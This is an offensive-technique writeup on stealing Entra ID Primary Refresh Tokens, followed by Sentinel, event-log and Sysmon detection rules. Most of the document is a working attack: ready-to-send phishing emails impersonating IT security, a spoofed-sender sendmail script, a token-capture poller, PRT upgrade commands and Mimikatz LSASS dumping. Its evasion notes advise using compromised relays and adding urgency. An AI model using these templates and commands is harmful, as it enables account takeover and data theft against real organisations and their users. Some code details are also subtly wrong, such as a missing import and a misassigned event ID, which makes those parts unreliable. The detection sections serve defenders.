# [REALWORLD-014]: PRT Device Identity Manipulation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-014 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access, Lateral Movement |
| **Platforms** | Hybrid/Entra ID |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10/11; All Entra ID tenants |
| **Patched In** | No patch available; requires policy/architecture changes |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** A Primary Refresh Token (PRT) is a high-value token issued by Entra ID to users who sign in on Azure AD-joined or hybrid-joined devices. It enables single sign-on (SSO) across all Microsoft services without re-authentication. Attackers can steal PRTs through multiple methods: (1) Memory dumping via Mimikatz on compromised endpoints (especially Gen 1 VMs without TPM), (2) Device code phishing to acquire refresh tokens then upgrade them to PRTs using stolen device certificates, (3) Intercepting token material during the Windows device onboarding process. Once a PRT is stolen, the attacker can replay it from any network location, bypassing passwords and MFA entirely, gaining access to Azure Portal, M365, Teams, SharePoint, and other cloud services as the victim user. The attack is particularly dangerous because stolen PRTs remain valid for 14-90 days and can be used silently without triggering typical anomaly detection.

**Attack Surface:** Entra ID token issuance, Azure AD-joined device registry (PRT storage), Windows Hello for Business enrollment flows, OAuth device code flow, device certificate storage (registry or TPM), Primary Refresh Token lifecycle (14-90 days validity).

**Business Impact:** **Complete cloud service compromise for affected users, unrestricted access to sensitive M365 data, lateral movement to cloud-only and hybrid resources, and persistent access that survives password resets and MFA disablement.** A stolen PRT from a privileged user (Global Admin, Exchange Admin) results in full tenant compromise. Even PRT theft from regular users enables access to corporate email, files, Teams messages, and all user-accessible resources.

**Technical Context:** PRT theft can occur in as little as 5-10 minutes from initial device compromise. The attack is silent—no user-visible prompts, no MFA challenges, no password entry by attacker. Detection is difficult because stolen PRT usage generates legitimate-looking sign-in logs (TokenIssuerType: PRT) indistinguishable from normal user activity unless correlated with device state or geographic anomalies. Organizations that do not monitor for PRT theft or enforce TPM-protected device storage face severe compromise risk.

### Operational Risk

- **Execution Risk:** High - Requires either device compromise, phishing success, or access to unprotected device certificate/key storage. Once achieved, token extraction is trivial.
- **Stealth:** High - PRT usage generates minimal audit signals; sign-in logs appear normal; no malware required for token usage (tools like browsers, curl can use PRT).
- **Reversibility:** No - Once PRT is extracted and used, incident response is slow. Revoking refresh tokens requires hunting all compromised user activity. Device compliance status is separate from PRT validity, so deleted/disabled devices don't immediately invalidate stolen PRTs.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8 5.1.4 | Multi-factor authentication (MFA) must be enabled for all users |
| **CIS Benchmark** | v8 5.3 | Ensure that device-based conditional access policies are configured |
| **DISA STIG** | AC-2(1) | Service accounts must use multi-factor authentication for privileged access |
| **CISA SCuBA** | identity.4 | Multi-factor authentication must be enabled for all user accounts |
| **NIST 800-53** | IA-2(1) | MFA must be implemented for all administrative logons |
| **NIST 800-53** | IA-5 | Cryptographic mechanisms (TPM, cert storage) must protect authentication material |
| **GDPR** | Art. 32 | Security of Processing - Cryptographic protections for authentication tokens |
| **DORA** | Art. 9 | Protection and Prevention - Strong authentication and access controls |
| **NIS2** | Art. 21 | Cyber Risk Management - Protection of critical authentication factors |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Token management controls |
| **ISO 27005** | Token Compromise Risk | Risk of unauthorized access via stolen authentication tokens |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- For memory-based theft: Local admin or system account on target device
- For device code phishing: Ability to send phishing email and control OAuth endpoint
- For registry extraction: Local admin or system equivalent privileges
- For TPM-protected PRT: Special techniques or TPM bypass (advanced)

**Required Access:**
- Network access to Microsoft authentication endpoints (login.microsoftonline.com)
- Access to device's local registry or memory (if targeting device-based theft)
- Ability to conduct phishing campaign (email infrastructure)
- Access to Azure AD token acquisition endpoints

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025; Windows 10/11 (with Entra ID join)
- **Entra ID:** All versions; all regions
- **PRT Features:** PRT available on Windows 10 v1809+, Windows 11, Server 2019+
- **TPM:** Supported on Gen 2 VMs, modern laptops; disabled on Gen 1 VMs

**Tools:**
- [ROADtools](https://github.com/dirkjanm/ROADtools) (PRT acquisition and upgrade)
- [AADInternals](https://github.com/Gerenios/AADInternals) (PRT handling, device cert export)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Memory-based PRT extraction)
- [Microsoft.Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell) (Token requests)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Device Code Phishing → PRT Acquisition

**Supported Versions:** Entra ID all versions; Windows 10/11, Server 2016+

#### Step 1: Initiate Device Code OAuth Flow

**Objective:** Start the OAuth device code flow, which generates a unique device code and code verification URI that the attacker will send in a phishing email to the target user.

**Command (On Attacker's Machine):**
```powershell
# Method 1: Using Azure CLI (Built-in Device Code Flow)
az login --use-device-code --allow-no-subscriptions

# Output will be displayed:
# To sign in, use a web browser to open the page https://microsoft.com/devicelogin
# and enter the code XXXXXXXXX to authenticate.

# Capture the device code
$deviceCode = "XXXXXXXXX"  # From the output above
```

**Command (Using ROADtools - Attacker Python Script):**
```bash
# On Linux/attacker machine, use ROADtools to generate device code
roadtx devicecode

# Output:
# {
#   "user_code": "XXXXXXXXX",
#   "device_code": "YYYYYYYYYYYY...",
#   "verification_url": "https://microsoft.com/devicelogin",
#   "expires_in": 900  # 15 minutes
# }

# Save device code for later use
echo "YYYYYYYYYYYY..." > /tmp/device_code.txt
```

**Expected Output:**
```
Device Code: XXXXXXXXX
Verification URL: https://microsoft.com/devicelogin
Expiration: 900 seconds (15 minutes)
```

**What This Means:**
- A temporary code pair has been created for OAuth device code flow
- Victim needs to visit the verification URL and enter the device code
- Attacker's device waits for the victim to authenticate
- Once victim authenticates and grants permission, tokens are sent to attacker's device
- Device code is valid for 15 minutes; if not used, flow expires

**OpSec & Evasion:**
- Device code flow to Microsoft URLs is legitimate and not inherently suspicious
- The phishing attack is social engineering, not technical exploitation
- Phishing email should appear to come from legitimate source (spoofed company email)
- URL in email is the REAL Microsoft device login page, making detection harder
- Detection likelihood: Medium - Only detectable if org monitors device code URL clicks

**Troubleshooting:**
- **Error:** "Device code flow not supported for this app"
  - **Cause:** Some applications don't support device code flow
  - **Fix:** Use Azure CLI or PowerShell which fully support device code flow
  - **Ref:** [Azure CLI Device Code Flow](https://learn.microsoft.com/en-us/cli/azure/get-started-with-azure-cli)

- **Error:** "Device code expired (900 seconds passed)"
  - **Cause:** Victim did not complete authentication within 15 minutes
  - **Fix:** Restart the flow with new device code; send follow-up phishing email
  - **Ref:** [OAuth Device Code Flow Timeout](https://datatracker.ietf.org/doc/html/rfc8628)

**References & Proofs:**
- [OAuth 2.0 Device Authorization Flow RFC 8628](https://datatracker.ietf.org/doc/html/rfc8628)
- [Azure CLI Device Code Login](https://learn.microsoft.com/en-us/cli/azure/authenticate-azure-cli#sign-in-with-a-device-code)
- [Dirk-Jan Mollema - Device Code Phishing](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

---

#### Step 2: Craft and Send Phishing Email with Device Code

**Objective:** Send a convincing phishing email to target user with the legitimate Microsoft device code login URL, disguised as a legitimate business request.

**Phishing Email Template #1 (Security Update):**
```
From: IT-Security@company.com
To: victim.user@company.com
Subject: URGENT: Verify Your Microsoft Account - Security Update Required

Dear [Victim Name],

Due to recent security policy updates, all users must verify their Microsoft account credentials immediately.

Please verify your account by clicking the link below and entering your authentication code:

https://microsoft.com/devicelogin

When prompted, enter the following code: XXXXXXXXX

This verification process typically takes less than 1 minute and is required to maintain access to company resources.

If you do not complete this verification within 24 hours, your account will be temporarily locked.

Thank you,
Microsoft Security Team
---
This is an automated message. Do not reply to this email.
```

**Phishing Email Template #2 (Compliance Check):**
```
From: compliance@company.com  
To: victim.user@company.com
Subject: ACTION REQUIRED: Account Compliance Check - Expires in 24 Hours

Hello [Victim Name],

Your Microsoft account requires a compliance verification as part of our annual security audit.

To complete this process, please visit: https://microsoft.com/devicelogin
Enter code when prompted: XXXXXXXXX

Deadline: [Tomorrow's Date]

Account Information:
Username: victim.user@company.com
Current MFA Status: [Auto-filled from GAL]

Questions? Contact IT Support at [help desk email]

Best regards,
Compliance Team
```

**Command (Send Phishing Email via External Relay - Attacker Infrastructure):**
```bash
#!/bin/bash
# Using legitimate email service to send phishing
# Attacker controls mail relay (e.g., compromised email server or third-party relay)

EMAIL_TO="victim.user@company.com"
DEVICE_CODE="XXXXXXXXX"
DEVICE_LOGIN_URL="https://microsoft.com/devicelogin"

# Using sendmail or postfix
(
echo "From: IT-Security@company.com"
echo "To: $EMAIL_TO"
echo "Subject: URGENT: Verify Your Microsoft Account - Security Update"
echo ""
echo "Dear User,"
echo "Please verify your account immediately:"
echo ""
echo "Visit: $DEVICE_LOGIN_URL"
echo "Code: $DEVICE_CODE"
echo ""
echo "Thank you,"
echo "Microsoft Security Team"
) | sendmail -t
```

**Expected Output (If Email Sent Successfully):**
```
Email queued successfully
Recipient: victim.user@company.com
Subject: URGENT: Verify Your Microsoft Account
Status: Sent
```

**What This Means:**
- Victim receives phishing email with legitimate Microsoft URL
- Victim clicks link and is taken to REAL Microsoft device login page
- Victim enters device code and signs in with their credentials and MFA
- Victim's authentication is sent to Microsoft servers (attacker's device receives token)
- Attacker now has refresh token for victim without intercepting credentials

**OpSec & Evasion:**
- Email domain spoofing (using company domain) requires compromised email infrastructure or external relay
- Legitimate Microsoft URL makes email appear trustworthy
- Urgent language and authority figures (IT Security, Compliance) increase click rates
- No malware or exploits needed; purely social engineering
- Detection likelihood: Low-Medium - Email filtering may flag spoofed domains, but legitimate Microsoft URLs bypass many filters

**Troubleshooting:**
- **Error:** "Email bounced - authentication failure"
  - **Cause:** Email relay requires authentication or has restrictions
  - **Fix:** Use legitimate compromised email server or external relay service
  - **Ref:** [Email Relay Services](https://en.wikipedia.org/wiki/Open_relay)

- **Error:** "Email flagged as spam"
  - **Cause:** Email spam filters detected phishing indicators
  - **Fix:** Use reputable sender domain, include company branding, avoid spam trigger words
  - **Ref:** [Email Phishing Detection](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-phishing-protection)

**References & Proofs:**
- [Dirk-Jan Mollema - Device Code Phishing](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)
- [Microsoft Device Login Page](https://microsoft.com/devicelogin)
- [Phishing Simulation Best Practices](https://learn.microsoft.com/en-us/defender-office-365/attack-simulation-training)

---

#### Step 3: Wait for Victim Authentication and Capture Refresh Token

**Objective:** After victim signs in on the Microsoft device login page, capture the refresh token that is sent back to the attacker's device.

**Command (Monitor Device Code Flow - On Attacker's Machine):**
```powershell
# Using ROADtools to wait for victim authentication
# Command blocks until victim completes sign-in or timeout

roadtx devicecode --monitor

# Or using PowerShell with Azure CLI
# After running: az login --use-device-code
# The CLI will wait and automatically receive the token once victim signs in

# Monitor the process (in another terminal)
$process = Get-Process az*
Wait-Process -InputObject $process

# Once victim signs in, token is automatically cached
# Check for cached credentials
cat ~/.azure/accessTokens.json | Select-String "refreshToken"
```

**Command (Capture Token Programmatically):**
```python
# Python script to intercept and log device code flow completion
import requests
import json
from datetime import datetime

# Device code from Step 1
DEVICE_CODE = "YYYYYYYYYYYY..."
TENANT_ID = "organizations"  # or specific tenant

# Poll for token completion
URL = "https://login.microsoftonline.com/{}/oauth2/v2.0/token".format(TENANT_ID)

PAYLOAD = {
    "client_id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI client ID
    "device_code": DEVICE_CODE,
    "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
}

# Poll every 5 seconds (device code flow spec)
while True:
    response = requests.post(URL, data=PAYLOAD)
    result = response.json()
    
    if "refresh_token" in result:
        # Success! Victim has authenticated
        print(f"[+] Refresh Token Captured!")
        print(f"[+] User: {result.get('foci')}")
        print(f"[+] Token (first 50 chars): {result['refresh_token'][:50]}...")
        
        # Save token
        with open("captured_refresh_token.txt", "w") as f:
            f.write(result['refresh_token'])
        break
    elif result.get("error") == "authorization_pending":
        print(f"[*] Waiting for user authentication... ({datetime.now()})")
        time.sleep(5)
    else:
        print(f"[-] Error: {result}")
        break
```

**Expected Output:**
```
[*] Waiting for user authentication... (2025-01-10 14:30:05)
[*] Waiting for user authentication... (2025-01-10 14:30:10)
[*] Waiting for user authentication... (2025-01-10 14:30:15)
[+] Refresh Token Captured!
[+] User: victim.user@company.com
[+] Token (first 50 chars): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6In...
```

**What This Means:**
- Victim successfully signed in on Microsoft device login page
- Victim completed their MFA (if enabled)
- Victim's refresh token has been issued to attacker's device
- Token is valid for ~90 days (depending on org policies)
- Token can be used to request new access tokens without user interaction

**OpSec & Evasion:**
- Monitoring device code flow is silent (no suspicious network patterns)
- Refresh token is returned to attacker's registered device, not intercepted
- Victim sees normal "sign-in successful" message and doesn't know they were compromised
- No malware deployed, no direct credential compromise
- Detection likelihood: Low - Device code flow polling is legitimate background activity

**Troubleshooting:**
- **Error:** "authorization_pending - User did not authenticate"
  - **Cause:** Victim did not complete sign-in within 15 minutes, or flow timed out
  - **Fix:** Resend phishing email with new device code; increase urgency
  - **Ref:** [Device Code Flow Timeout](https://datatracker.ietf.org/doc/html/rfc8628)

- **Error:** "invalid_grant - Refresh token not issued"
  - **Cause:** User's organization policy disables refresh tokens or device code flow
  - **Fix:** Target different user or different organization; try alternative phishing method
  - **Ref:** [Entra ID Refresh Token Policies](https://learn.microsoft.com/en-us/entra/identity/conditional-access/howto-conditional-access-session-lifetime)

**References & Proofs:**
- [ROADtools devicecode Monitor](https://github.com/dirkjanm/ROADtools)
- [Azure CLI Device Code Token Capture](https://learn.microsoft.com/en-us/cli/azure/authenticate-azure-cli)
- [Dirk-Jan Mollema - Device Code Phishing](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

---

#### Step 4: Upgrade Refresh Token to Primary Refresh Token (PRT)

**Objective:** Use the captured refresh token, combined with a stolen device certificate and transport key, to request a Primary Refresh Token that bypasses MFA and password requirements.

**Command (Using ROADtools - PRT Upgrade):**
```bash
# Prerequisite: Have device certificate and transport key from evil VM
# Files: device_cert.pfx, device_transport_key.bin

# Use roadtx to upgrade refresh token to PRT
roadtx prtenrich \
    -c device_cert.pfx \
    -k device_transport_key.bin \
    -r "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6In..." \
    --token-output prt.token

# Output:
# [+] PRT Successfully acquired
# [+] PRT Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6In...
# [+] PRT is valid for 14 days
```

**Command (Using AADInternals - PowerShell Alternative):**
```powershell
Import-Module AADInternals

# Variables (from evil VM extraction)
$deviceCertPath = "C:\temp\device_cert.pfx"
$transportKeyPath = "C:\temp\device_transport_key.bin"
$refreshToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6In..."

# Read certificate and key
$deviceCert = Get-Content $deviceCertPath -Encoding Byte
$transportKey = Get-Content $transportKeyPath -Encoding Byte

# Request PRT using device identity and refresh token
$prt = New-AADIntPrimaryRefreshToken `
    -DeviceCertificate $deviceCert `
    -DeviceTransportKey $transportKey `
    -RefreshToken $refreshToken

Write-Host "PRT Successfully Acquired: $prt"
Write-Host "PRT is valid for 14 days (can be renewed to 90 days)"

# Save PRT for later use
$prt | Out-File -FilePath "C:\temp\prt.token" -NoNewline
```

**Expected Output:**
```
[+] Validating device certificate... OK
[+] Decrypting transport key... OK
[+] Requesting PRT with device identity...
[+] PRT Successfully acquired!
[+] PRT Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlNoNmFDb0NBQyIsInR5cCI6IkpXVCJ9...
[+] Token Valid Until: 2025-01-24 (14 days)
[+] PRT can be renewed if used within renewal window (up to 90 days)
```

**What This Means:**
- Attacker now has valid PRT for the phished user
- PRT is a high-value token that represents both user AND device trust
- PRT allows accessing all Entra ID and Microsoft 365 services
- MFA is already satisfied (captured via device code flow where victim completed MFA)
- Password is NOT required; PRT can be used even if victim changes their password
- Token is valid for 14 days and can be automatically renewed

**OpSec & Evasion:**
- Requesting PRT generates logs (TokenIssuerType: PRT in SignInLogs)
- However, logs appear normal if the device ID matches a legitimate device
- PRT upgrade uses legitimate OAuth token exchange (no anomalies)
- Tool execution (roadtx, AADInternals) is only visible on attacker's machine
- Detection likelihood: Medium - Requires correlation of device cert origin with new user login

**Troubleshooting:**
- **Error:** "Device certificate validation failed"
  - **Cause:** Device cert is expired, corrupted, or not properly formatted
  - **Fix:** Re-extract device certificate from evil VM; verify PFX format
  - **Ref:** [AADInternals Certificate Extraction](https://github.com/Gerenios/AADInternals)

- **Error:** "Transport key decryption failed"
  - **Cause:** Transport key is corrupted or in wrong format
  - **Fix:** Re-extract transport key; ensure binary format is correct
  - **Ref:** [BeyondTrust Evil VM - Key Extraction](https://www.beyondtrust.com/blog/entry/evil-vm)

- **Error:** "Refresh token is invalid or expired"
  - **Cause:** Refresh token was not captured correctly, or too much time has passed
  - **Fix:** Re-run phishing to capture new refresh token; use within 1 hour of capture
  - **Ref:** [Refresh Token Lifetime](https://learn.microsoft.com/en-us/entra/identity/conditional-access/howto-conditional-access-session-lifetime)

**References & Proofs:**
- [ROADtools prtenrich Documentation](https://github.com/dirkjanm/ROADtools)
- [AADInternals PRT Creation](https://github.com/Gerenios/AADInternals)
- [Dirk-Jan Mollema - PRT Abuse](https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/)

---

### METHOD 2: Mimikatz Memory Extraction (From Compromised Device)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11

#### Step 1: Execute Mimikatz with Local Admin Privileges

**Objective:** Dump all tokens and credentials from memory, including PRTs if victim user is logged in to the compromised device.

**Command (On Compromised Device with Local Admin):**
```cmd
# Download Mimikatz (pre-compiled or build from source)
mimikatz.exe

# Output: mimikatz # prompt

# Enable debug privilege (required for LSASS access)
privilege::debug

# Output: Privilege '20' OK

# List all tokens in memory
token::list /csv

# Output shows all tokens currently in memory
# Look for tokens with USER claims containing admin accounts
```

**Command (Extract PRT Specifically):**
```cmd
mimikatz # dpapi::cache  
# Shows DPAPI-cached credentials

mimikatz # sekurlsa::logonpasswords
# Dumps plaintext passwords and tokens from LSASS

# Or more specific:
mimikatz # token::whoami
# Shows current token context

mimikatz # sekurlsa::prt
# Attempts to extract Primary Refresh Tokens (newer Mimikatz versions)
```

**PowerShell Alternative (Invoking Mimikatz):**
```powershell
# Load Mimikatz reflectively (evades disk-based detection)
$mimikatzPath = "C:\temp\mimikatz.exe"

# Run Mimikatz in background
Start-Process -FilePath $mimikatzPath -ArgumentList "privilege::debug`nsekurlsa::logonpasswords`ntoken::list /csv" -NoNewWindow -PassThru | Wait-Process

# Or use Invoke-Mimikatz (powersploit)
Invoke-Mimikatz -Command "privilege::debug`nsekurlsa::prt"

# Output includes any PRTs in memory
```

**Expected Output:**
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::prt
PRT - Current PRT:
 * PRT Cookie                 : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...
 * Encryption Key             : [hex key material]
 * Transport Key              : [hex key material]
 * User                       : VICTIM.USER@COMPANY.COM
 * Device                     : DEVICE-GUID
```

**What This Means:**
- Mimikatz has successfully extracted tokens from LSASS memory
- PRTs are displayed in plaintext (or can be extracted)
- Attacker can use extracted PRTs to authenticate as the victim user
- Attack is successful if victim user is logged in to the device
- No phishing required; direct memory access method

**OpSec & Evasion:**
- Mimikatz execution on disk is highly detectable (Windows Defender, EDR tools)
- In-memory execution (reflective loading) evades file-based detection but still triggers behavior detection
- LSASS access (required for PRT extraction) is closely monitored by modern EDR
- Detection likelihood: High - Mimikatz is a known offensive tool and most orgs have signatures for it

**Troubleshooting:**
- **Error:** "Failed to enable debug privilege"
  - **Cause:** Not running with local admin or SYSTEM privileges
  - **Fix:** Run PowerShell as Administrator; use UAC bypass if needed
  - **Ref:** [UAC Bypass Techniques](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker-overview)

- **Error:** "sekurlsa not available"
  - **Cause:** Mimikatz version is too old or incompatible with Windows version
  - **Fix:** Update to latest Mimikatz (2.2.0+)
  - **Ref:** [Mimikatz GitHub Latest Release](https://github.com/gentilkiwi/mimikatz)

- **Error:** "PRT not found in memory"
  - **Cause:** No users are logged in, or victim user has no active PRT
  - **Fix:** Wait for victim user to log in, or use phishing method instead
  - **Ref:** [PRT Lifecycle](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)

**References & Proofs:**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
- [PRT Extraction via Mimikatz](https://pulsesecurity.co.nz/articles/exploiting-entraid-prt)

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1528-1 (Steal Application Access Token)
- **Test Name:** Acquire Access Token via Device Code Flow
- **Description:** Simulate device code phishing to obtain refresh token and upgrade to PRT.
- **Supported Versions:** Entra ID all versions; Windows 10/11, Server 2019+
- **Command:**
  ```powershell
  Invoke-AtomicTest T1528 -TestNumbers 1
  ```
- **Cleanup Command:**
  ```powershell
  Invoke-AtomicTest T1528 -TestNumbers 1 -Cleanup
  ```

**Reference:** [Atomic Red Team - T1528](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---

## 7. TOOLS & COMMANDS REFERENCE

#### [ROADtools](https://github.com/dirkjanm/ROADtools)

**Version:** 1.0.0+ (latest)
**Minimum Version:** 0.9.0
**Supported Platforms:** Linux, macOS, Windows (Python 3.7+)

**Version-Specific Notes:**
- Version 0.9.x: Basic device code, refresh token handling
- Version 1.0.0+: Full PRT support, device certificate validation, browser auth
- Version 1.0.3+: Enhanced token refresh, multi-tenant support

**Installation:**
```bash
pip install roadtools
# Or from GitHub:
git clone https://github.com/dirkjanm/ROADtools
cd ROADtools
pip install .
```

**Usage (Device Code Flow):**
```bash
roadtx devicecode
# Output: Device code and verification URL
```

**Usage (PRT Upgrade):**
```bash
roadtx prtenrich -c device_cert.pfx -k device_transport_key.bin -r refresh_token
```

---

#### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+ (latest)
**Minimum Version:** 2.1.0
**Supported Platforms:** Windows

**Installation:**
```cmd
# Download pre-compiled from releases
# Or build from source:
git clone https://github.com/gentilkiwi/mimikatz
cd mimikatz
cmake -B build && cmake --build build --config Release
```

**Usage (PRT Extraction):**
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::prt
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Device Code Phishing Signature (RT → PRT Transition)

**Rule Configuration:**
- **Required Table:** SigninLogs, AuditLogs
- **Required Fields:** UserPrincipalName, AuthenticationRequirement, TokenIssuerType, IPAddress
- **Alert Severity:** High
- **Frequency:** Real-time or every 5 minutes
- **Applies To Versions:** All Entra ID tenants

**KQL Query:**
```kusto
// Detect RefreshToken sign-in followed by PRT issuance from different device/location
let refreshTokenSignins = SigninLogs
  | where AuthenticationMethodsUsed contains "refreshToken"
  | where Status.additionalDetails contains "Device code flow" or AppDisplayName contains "Device Registration"
  | where TimeGenerated > ago(2h)
  | project RefreshTokenUPN = UserPrincipalName, RefreshTokenTime = TimeGenerated, RefreshTokenIP = IPAddress, RefreshTokenDeviceId = DeviceId;

let prtSignins = SigninLogs
  | where TokenIssuerType == "PRT"
  | where TimeGenerated > ago(2h)
  | project PRTUserPrincipal = UserPrincipalName, PRTTime = TimeGenerated, PRTIP = IPAddress, PRTDeviceId = DeviceId;

refreshTokenSignins
| join kind=inner prtSignins on $left.RefreshTokenUPN == $right.PRTUserPrincipal
| where RefreshTokenTime < PRTTime and datetime_diff('minute', PRTTime, RefreshTokenTime) < 30
| where RefreshTokenIP != PRTIP or RefreshTokenDeviceId != PRTDeviceId
| project TimeGenerated = PRTTime, UserPrincipalName = RefreshTokenUPN, 
          RefreshTokenTime, PRTTime, RefreshTokenIP, PRTIP, 
          TimeGap = datetime_diff('minute', PRTTime, RefreshTokenTime),
          AlertLevel = "High"
```

**What This Detects:**
- Sign-in using refresh token followed by PRT issuance
- Different device IDs or IP addresses between events (indicates phishing)
- Within 30-minute window (typical phishing attack timeline)
- Particularly sensitive if user is admin (Global Admin, Exchange Admin)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Device Code Phishing - RefreshToken to PRT`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `2 hours`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `UserPrincipalName`
5. Click **Review + create**

---

#### Query 2: PRT Memory Extraction (Mimikatz Signature)

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceEvents, Process Creation
- **Required Fields:** Image, CommandLine, ParentImage, Computer
- **Alert Severity:** Critical
- **Frequency:** Real-time or every 1 minute
- **Applies To Versions:** Windows Server 2016+

**KQL Query:**
```kusto
// Detect Mimikatz or tools attempting to extract PRT from memory
union isfuzzy=true
(
  SecurityEvent
  | where EventID == 3  // Process creation
  | where (ProcessName contains "mimikatz" or CommandLine contains "mimikatz" or
           CommandLine contains "sekurlsa" or CommandLine contains "token::prt" or
           CommandLine contains "privilege::debug")
),
(
  DeviceEvents
  | where ActionType == "ProcessCreated"
  | where FileName in ("mimikatz.exe", "x64\mimikatz.exe", "x86\mimikatz.exe")
  | where ProcessCommandLine contains "prt" or ProcessCommandLine contains "sekurlsa"
)
| project TimeGenerated, Computer, FileName, CommandLine = ProcessCommandLine, InitiatingProcess = ParentImage
```

**What This Detects:**
- Execution of Mimikatz or similar memory dumping tools
- Commands targeting PRT or LSASS credentials
- Elevation to debug privilege (sekurlsa requires admin)
- Critical indicator of active credential theft

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Mimikatz PRT Extraction Attempt`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `1 minute`
   - Lookup data from the last: `1 hour`
4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `Computer, InitiatingProcess`
5. Click **Review + create**

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security Event Log
- **Trigger:** Process creation with image name "mimikatz.exe" or commandline containing "sekurlsa", "privilege::debug", "token::prt"
- **Filter:** Image contains "mimikatz" OR CommandLine contains "sekurlsa"
- **Applies To Versions:** Windows Server 2016+, Windows 10/11

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable: **Audit Process Creation** → **Success and Failure**
4. Run `gpupdate /force`

**Manual Configuration Steps (PowerShell):**
```powershell
# Enable detailed process creation audit
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

# Query for Mimikatz execution
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-1)} | 
  Where-Object {$_.Message -match "mimikatz|sekurlsa|privilege::debug"} |
  Select-Object TimeCreated, Properties
```

---

**Event ID: 5156 (Windows Firewall - Connection Attempt)**
- **Log Source:** Security Event Log
- **Trigger:** Application attempting outbound connection to Microsoft authentication endpoints (login.microsoftonline.com, graph.microsoft.com)
- **Filter:** Application contains "python.exe", "powershell.exe", "mimikatz.exe"
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps:**
1. Open **Windows Defender Firewall with Advanced Security** (wf.msc)
2. Click **Monitoring** → Enable logging for **Firewall** events
3. Set log file location: `C:\Windows\System32\logfiles\firewall\pfirewall.log`
4. Enable logging for inbound and outbound connections

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+

```xml
<!-- Detect Mimikatz and PRT extraction -->
<Sysmon schemaversion="4.82">
  <RuleGroup name="Detect-Mimikatz" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">mimikatz</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">sekurlsa</CommandLine>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <Image condition="contains">powershell</Image>
      <CommandLine condition="contains">privilege::debug</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect LSASS access attempts -->
  <RuleGroup name="Detect-LSASS-Access" groupRelation="or">
    <ProcessAccess onmatch="include">
      <TargetImage condition="contains">lsass.exe</TargetImage>
      <GrantedAccess condition="contains">0x1010</GrantedAccess>  <!-- PROCESS_VM_READ -->
    </ProcessAccess>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
